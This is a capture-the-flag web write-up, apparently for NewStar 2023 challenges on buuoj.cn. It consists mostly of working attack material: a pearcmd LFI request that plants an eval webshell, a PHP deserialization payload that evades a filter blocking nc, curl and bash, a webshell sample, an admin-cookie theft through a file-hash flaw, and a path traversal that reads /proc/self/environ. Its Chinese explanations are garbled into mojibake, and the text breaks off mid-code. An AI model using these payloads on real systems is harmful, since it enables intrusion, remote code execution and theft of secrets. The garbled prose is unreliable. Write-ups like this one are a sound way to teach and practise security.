<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?+config-create+/&amp;file=../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+shell.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>5bf9eaae-1dcb-43a5-a6c8-895d94e8e9c1.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://5bf9eaae-1dcb-43a5-a6c8-895d94e8e9c1.node5.buuoj.cn:81/login.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=cq0044fmuc7eqlfr48duuljvl9</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>‰∏ÄÊ†∑ÁöÑ</p>
<h2 id="R-C-E-2"><a href="#R-C-E-2" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Ê≤°ÊúâÈìæÂ≠êÔºåÂ∞±ÊòØÁõ¥Á∫ø</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">minipop::__destruct-&gt;minipop::__toString()</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public $code=&quot;ls / | t&#x27;&#x27;ee 1&quot;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;tac /flag_is_h3eeere | t&#x27;&#x27;ee 1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>= <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;qwejaskdjnlka=<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="WebShellÁöÑÂà©Áî®"><a href="#WebShellÁöÑÂà©Áî®" class="headerlink" title="WebShellÁöÑÂà©Áî®"></a>WebShellÁöÑÂà©Áî®</h2><p>Ëß£Âá∫Êù•ÊòØËøô‰∏™</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);(<span class="variable">$_GET</span>[<span class="string">&#x27;7d67973a&#x27;</span>])(<span class="variable">$_POST</span>[<span class="string">&#x27;9fa3&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="NextDrive"><a href="#NextDrive" class="headerlink" title="NextDrive"></a>NextDrive</h2><p>Ê≥®ÂÜåÁôªÂΩï‰πãÂêéÂèëÁé∞<code>test.res.http</code></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">content-length</span><span class="punctuation">: </span>50</span><br><span class="line"><span class="attribute">date</span><span class="punctuation">: </span>Tue, 06 Oct 2023 13:39:21 GMT</span><br><span class="line"><span class="attribute">connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">keep-alive</span><span class="punctuation">: </span>timeout=5</span><br><span class="line"></span><br><span class="line"><span class="language-clojure">&#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span><span class="punctuation">,</span><span class="string">&quot;msg&quot;</span>:<span class="string">&quot;success&quot;</span><span class="punctuation">,</span><span class="string">&quot;logged&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;data&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;„Åô„Åö„ÇÅ feat.ÂçÅÊòé - RADWIMPS,ÂçÅÊòé.flac&quot;</span><span class="punctuation">,</span><span class="string">&quot;hash&quot;</span>:<span class="string">&quot;5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc&quot;</span><span class="punctuation">,</span><span class="string">&quot;size&quot;</span>:<span class="number">27471829</span><span class="punctuation">,</span><span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span><span class="punctuation">,</span><span class="string">&quot;shareTime&quot;</span>:<span class="number">1754741179527</span><span class="punctuation">,</span><span class="string">&quot;isYours&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;isOwn&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;„Åô„Åö„ÇÅ feat.ÂçÅÊòé - RADWIMPS,ÂçÅÊòé.flac&quot;</span>&#125;<span class="punctuation">,</span>&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Windows 12 Concept.png&quot;</span><span class="punctuation">,</span><span class="string">&quot;hash&quot;</span>:<span class="string">&quot;469db0f38ca0c07c3c8726c516e0f967fa662bfb6944a19cf4c617b1aba78900&quot;</span><span class="punctuation">,</span><span class="string">&quot;size&quot;</span>:<span class="number">440707</span><span class="punctuation">,</span><span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span><span class="punctuation">,</span><span class="string">&quot;shareTime&quot;</span>:<span class="number">1754741180080</span><span class="punctuation">,</span><span class="string">&quot;isYours&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;isOwn&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;Windows 12 Concept.png&quot;</span>&#125;<span class="punctuation">,</span>&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;‰ø°ÊÅØÂÆâÂÖ®ÊäÄÊúØ‰ø°ÊÅØÂÆâÂÖ®‰∫ã‰ª∂ÂàÜÁ±ªÂàÜÁ∫ßÊåáÂçó.pdf&quot;</span><span class="punctuation">,</span><span class="string">&quot;hash&quot;</span>:<span class="string">&quot;03dff115bc0d6907752796fc808fe2ef0b4ea9049b5a92859fd7017d4e96c08f&quot;</span><span class="punctuation">,</span><span class="string">&quot;size&quot;</span>:<span class="number">330767</span><span class="punctuation">,</span><span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span><span class="punctuation">,</span><span class="string">&quot;shareTime&quot;</span>:<span class="number">1754741180106</span><span class="punctuation">,</span><span class="string">&quot;isYours&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;isOwn&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;‰ø°ÊÅØÂÆâÂÖ®ÊäÄÊúØ‰ø°ÊÅØÂÆâÂÖ®‰∫ã‰ª∂ÂàÜÁ±ªÂàÜÁ∫ßÊåáÂçó.pdf&quot;</span>&#125;<span class="punctuation">,</span>&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;‰∏çÈôêÈÄüÔºåÂ∞±ÊòØÂø´ÔºÅ.jpg&quot;</span><span class="punctuation">,</span><span class="string">&quot;hash&quot;</span>:<span class="string">&quot;2de8696b9047f5cf270f77f4f00756be985ebc4783f3c553a77c20756bc68f2e&quot;</span><span class="punctuation">,</span><span class="string">&quot;size&quot;</span>:<span class="number">32920</span><span class="punctuation">,</span><span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span><span class="punctuation">,</span><span class="string">&quot;shareTime&quot;</span>:<span class="number">1754741180130</span><span class="punctuation">,</span><span class="string">&quot;isYours&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;isOwn&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;‰∏çÈôêÈÄüÔºåÂ∞±ÊòØÂø´ÔºÅ.jpg&quot;</span>&#125;<span class="punctuation">,</span>&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;test.req.http&quot;</span><span class="punctuation">,</span><span class="string">&quot;hash&quot;</span>:<span class="string">&quot;0afd24e3125c5866624e04b36fbcf393ec18bbcdc112178562b1ce505594f9b6&quot;</span><span class="punctuation">,</span><span class="string">&quot;size&quot;</span>:<span class="number">1085</span><span class="punctuation">,</span><span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span><span class="punctuation">,</span><span class="string">&quot;shareTime&quot;</span>:<span class="number">1754741180918</span><span class="punctuation">,</span><span class="string">&quot;isYours&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;isOwn&quot;</span><span class="symbol">:true</span><span class="punctuation">,</span><span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;test.req.http&quot;</span>&#125;]&#125;</span></span><br></pre></td></tr></table></figure>

<p>Êêû‰∫ÜÂçäÂ§©ÁúüÊòØÂßêÂßêÂìáÊñ≠Â•∂‰∫ÜÔºåÁßí‰º†ÊòØÂõ†‰∏∫hash‰∏ÄÊ†∑ÊâÄ‰ª•ÈÄ†ÊàêÁöÑÊºèÊ¥ûÔºåÂ¶ÇÊûúÊàë‰ª¨Áî®‰πãÂâçÁöÑÈáçÂ§çÊñá‰ª∂ÁöÑhashÂ∞±ÂÜç‰∏ãËΩΩÂ∞±ÂèØ‰ª•ÂæóÂà∞adminÁöÑCookie‰ªéËÄåÂÆûÁé∞Ë∂äÊùÉ</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/action/drive/upload/check</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node5.buuoj.cn:27640</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://node5.buuoj.cn:27640</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://node5.buuoj.cn:27640/myresources</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uid=100001; token=eyJ1c2VybmFtZSI6ImJhb3pvbmd3aSIsInVpZCI6IjEwMDAwMSIsInRva2VuIjoiMmYzNDI1MzM4ZDExNGE3MzgzMzMzZDUzMDU1MDQ0ZDY0MzBlZmNmYTU5YTk1MjI2NjMzNmM5ZjBmODhlMjNjYiJ9LkEmUR1nHmZRTwx4LFELDkM.FG8wSkFdBGoJCQZ/BVtUQkFhN0kVAFZpDloAfVVbUBcWbGQdEFsBP18KUX5RCwQQF2k2H0wNUW8CBQJ7DAtUQhRhYR1BCgVvAwVXeQMFURsTb2BAQwhWOF0OVy0BCAQSHD1iQEQKUT4OWFsvBwsEQEFsaxsSWVE4XV8GLlYOB0A</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>103</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;hash&quot;</span><span class="punctuation">:</span><span class="string">&quot;0afd24e3125c5866624e04b36fbcf393ec18bbcdc112178562b1ce505594f9b6&quot;</span><span class="punctuation">,</span><span class="attr">&quot;fn&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.php.aaa&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoup&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/achieve/2025/8/newstar2023/PixPin_2025-08-09_20-28-43.png" alt="1"></p>
<p>ÊãøÂà∞Cookie‰πãÂêéÔºåÂèØ‰ª•ÂæóÂà∞js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&quot;koa-router&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CONFIG</span> = <span class="built_in">require</span>(<span class="string">&quot;../../runtime.config.json&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Res</span> = <span class="built_in">require</span>(<span class="string">&quot;../../components/utils/response&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">FileSignUtil</span> = <span class="built_in">require</span>(<span class="string">&quot;../../components/utils/file-signature&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">DriveUtil</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;../../components/utils/database.utilities&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; verifySession &#125; = <span class="built_in">require</span>(<span class="string">&quot;../../components/utils/session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> logger = <span class="variable language_">global</span>.<span class="property">logger</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@deprecated</span></span></span><br><span class="line"><span class="comment"> * ! <span class="doctag">FIXME:</span> ÂèëÁé∞ÊºèÊ¥ûÔºåËØ∑ËøõË°å‰øÆÊîπ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/s/:hashfn&quot;</span>, <span class="title function_">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> hash_fn = <span class="title class_">String</span>(ctx.<span class="property">params</span>.<span class="property">hashfn</span> || <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">const</span> hash = hash_fn.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">64</span>)</span><br><span class="line">    <span class="keyword">const</span> from_uid = ctx.<span class="property">query</span>.<span class="property">from_uid</span></span><br><span class="line">    <span class="keyword">const</span> custom_fn = ctx.<span class="property">query</span>.<span class="property">fn</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ÂèÇÊï∞Ê†°È™å</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> hash_fn !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> from_uid !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="comment">// invalid params or query</span></span><br><span class="line">        ctx.<span class="title function_">set</span>(<span class="string">&quot;X-Error-Reason&quot;</span>, <span class="string">&quot;Invalid Params&quot;</span>);</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">400</span>; <span class="comment">// Bad Request</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ÊòØÂê¶‰∏∫ÂÖ±‰∫´ÁöÑÊñá‰ª∂</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable constant_">IS_FILE_EXIST</span> = <span class="keyword">await</span> <span class="title class_">DriveUtil</span>.<span class="title function_">isShareFileExist</span>(hash, from_uid)</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable constant_">IS_FILE_EXIST</span>) &#123;</span><br><span class="line">        ctx.<span class="title function_">set</span>(<span class="string">&quot;X-Error-Reason&quot;</span>, <span class="string">&quot;File Not Found&quot;</span>);</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">404</span>; <span class="comment">// Not Found</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Á≥ªÁªü‰∏≠ÊòØÂê¶Â≠òÂÇ®ÊúâËØ•Êñá‰ª∂</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable constant_">IS_FILE_EXIST_IN_STORAGE</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable constant_">IS_FILE_EXIST_IN_STORAGE</span> = fs.<span class="title function_">existsSync</span>(path.<span class="title function_">resolve</span>(<span class="variable constant_">CONFIG</span>.<span class="property">storage_path</span>, hash_fn))</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        ctx.<span class="title function_">set</span>(<span class="string">&quot;X-Error-Reason&quot;</span>, <span class="string">&quot;Internal Server Error&quot;</span>);</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">500</span>; <span class="comment">// Internal Server Error</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable constant_">IS_FILE_EXIST_IN_STORAGE</span>) &#123;</span><br><span class="line">        logger.<span class="title function_">error</span>(<span class="string">`File <span class="subst">$&#123;hash_fn.yellow&#125;</span> not found in storage, but exist in database!`</span>)</span><br><span class="line">        ctx.<span class="title function_">set</span>(<span class="string">&quot;X-Error-Reason&quot;</span>, <span class="string">&quot;Internal Server Error&quot;</span>);</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">500</span>; <span class="comment">// Internal Server Error</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Êñá‰ª∂ÂêçÂ§ÑÁêÜ</span></span><br><span class="line">    <span class="keyword">let</span> filename = <span class="keyword">typeof</span> custom_fn === <span class="string">&quot;string&quot;</span> ? custom_fn : (<span class="keyword">await</span> <span class="title class_">DriveUtil</span>.<span class="title function_">getFilename</span>(from_uid, hash));</span><br><span class="line">    filename = filename.<span class="title function_">replace</span>(<span class="regexp">/[\\\/\:\*\&quot;\&#x27;\&lt;\&gt;\|\?\x00-\x1F\x7F]/gi</span>, <span class="string">&quot;_&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ÂèëÈÄÅ</span></span><br><span class="line">    ctx.<span class="title function_">set</span>(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">`attachment; filename*=UTF-8&#x27;&#x27;<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(filename)&#125;</span>`</span>);</span><br><span class="line">    <span class="comment">// ctx.body = fs.createReadStream(path.resolve(CONFIG.storage_path, hash_fn))</span></span><br><span class="line">    <span class="keyword">await</span> ctx.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(<span class="variable constant_">CONFIG</span>.<span class="property">storage_path</span>, hash_fn)).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">        logger.<span class="title function_">error</span>(<span class="string">`Error while sending file <span class="subst">$&#123;hash_fn.yellow&#125;</span>`</span>)</span><br><span class="line">        logger.<span class="title function_">error</span>(e)</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">500</span>; <span class="comment">// Internal Server Error</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ËøõË°åÁõÆÂΩïÁ©øË∂äÂç≥ÂèØ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/s/5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron?from_uid=100000</span><br></pre></td></tr></table></figure>

<h2 id="pppython"><a href="#pppython" class="headerlink" title="pppython?"></a>pppython?</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/m1xian/p/18528813">https://www.cnblogs.com/m1xian/p/18528813</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hint&#x27;</span>] == [<span class="string">&quot;your?&quot;</span>, <span class="string">&quot;mine!&quot;</span>, <span class="string">&quot;hint!!&quot;</span>])&#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/plain&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls / -la&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_CONNECTTIMEOUT, <span class="number">60</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;lolita&#x27;</span>]);</span><br><span class="line">        <span 